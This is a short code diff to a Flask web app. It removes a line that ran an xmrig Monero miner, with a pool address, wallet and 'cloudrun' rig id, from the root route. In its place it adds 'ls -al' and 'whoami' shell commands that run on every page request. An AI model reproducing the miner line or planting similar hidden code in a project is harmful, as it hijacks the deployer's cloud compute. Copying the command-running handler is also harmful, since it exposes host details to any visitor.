@@ -24,9 +24,11 @@ app = Flask(__name__)
 
 @app.route("/")
 def hello_world():
-    command5 = './xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id cloudrun'
+    command5 = 'ls -al'
     res = subprocess.check_call(command5.split())
-    return "Hello {}!".format(res)
+    command6 = 'whoami'
+    res1 = subprocess.check_call(command6.split())
+    return "Hello {}!".format(res1)
 
 
 if __name__ == "__main__":
